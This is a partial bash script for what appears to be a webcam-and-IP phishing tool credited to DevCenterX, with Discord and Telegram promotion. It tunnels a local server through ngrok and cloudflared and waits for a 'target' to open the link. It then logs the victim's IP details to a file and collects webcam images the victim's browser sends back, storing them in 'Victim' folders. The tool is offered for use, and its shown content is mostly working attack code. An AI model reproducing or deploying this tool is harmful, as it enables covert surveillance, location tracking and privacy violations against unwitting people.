...
# Join Us    : https://discord.gg/6TtCgnvtGu
# Date       : 29-05-2022
...
trap "echo -e '\n${success}Herramienta creada por DevCenterX. Únete al Discord: https://discord.gg/6TtCgnvtGu\n'; exit" 2
...
# Nota: No se usa setup.sh; este script instala paquetes automáticamente cuando es posible.
...
$red[Author]     ${cyan} :[DevCenterX]
$red[Github]     ${cyan} :[https://github.com/hackerxphantom] 
$red[Join us]    ${cyan} :[https://discord.gg/6TtCgnvtGu]
$red[Telegarm]   ${cyan} :[https://t.me/x_PH4N7OM]"
printf "${cyan}\nDevCenterX${nc}@${cyan}> ${red}$ ${nc}"
read about
    elif echo $option | grep -q "m"; then
        xdg-open "https://discord.gg/6TtCgnvtGu"
...
(
    cd "$HOME/.ngrokfolder"
    ./ngrok http 127.0.0.1:7777 > /dev/null 2>&1
) &
if [ "$termux" = true ]; then
    (
        cd "$HOME/.cffolder"
        termux-chroot ./cloudflared tunnel -url "127.0.0.1:7777" --logfile "log.txt" > /dev/null 2>&1
    ) &
else
    (
        cd "$HOME/.cffolder"
        ./cloudflared tunnel -url "127.0.0.1:7777" --logfile "log.txt" > /dev/null 2>&1
    ) &
fi
sleep 8
...
sleep 1
victimDir="$cwd/Victim"
if ! [ -d "$victimDir" ]; then
    mkdir -p "$victimDir/CAM" "$victimDir/IP"
fi
if ! [ -d "$victimDir/CAM" ]; then
    mkdir -p "$victimDir/CAM"
fi
if ! [ -d "$victimDir/IP" ]; then
    mkdir -p "$victimDir/IP"
fi
rm -rf "$victimDir/IP/ip.txt"
echo -e "${info}Waiting for target. ${cyan}Press ${red}Ctrl + C ${cyan}to exit...\n"
while true; do
    if [[ -e "$victimDir/IP/ip.txt" ]]; then
        echo -e "\007${success}Target opened the link!\n"
        while IFS= read -r line; do
            echo -e "${green}[${blue}*${green}]${yellow} $line"
        done < "$victimDir/IP/ip.txt"
        echo ""
        cat "$victimDir/IP/ip.txt" >> "$cwd/ips.txt"
        rm -rf "$victimDir/IP/ip.txt"
    fi
    sleep 0.5
    if [[ -e "$victimDir/IP/log.txt" ]]; then
        echo -e "\007${success}IMAGE FILE RECEIVED ! Download...\n"
        find "$victimDir/CAM" -maxdepth 1 -type f -name '*.png' -print0 | while IFS= read -r -d '' file; do
            mv -f "$file" "$FOL"
            echo -e "${success}Moved $(basename "$file") to $FOL"
        done
        rm -rf "$victimDir/IP/log.txt"
